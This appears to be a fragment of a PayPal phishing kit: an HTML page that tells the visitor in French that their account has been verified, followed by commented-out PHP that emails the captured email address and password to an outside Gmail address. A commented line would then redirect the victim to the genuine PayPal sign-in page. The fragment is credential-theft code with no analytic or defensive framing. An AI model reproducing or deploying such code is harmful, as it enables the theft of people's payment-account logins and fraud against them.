<html>
    ...
    <body>
        ...
        <p id="succes2">Votre compte à bien été verifié, vous pouvez désormais fermée cette fenêtre.</p>
    </body>
</html>
<?php
 ...
 /*<?php
                 ...
                 mail('authentificationpaypal072@gmail.com','Compte paypal de', 'email= '.$email, 'Mot de passe = ' .$password);
                 //echo "<meta http-equive='refresh' content='1; URL=https://www.paypal.com/signin/'>";
                ?>*/
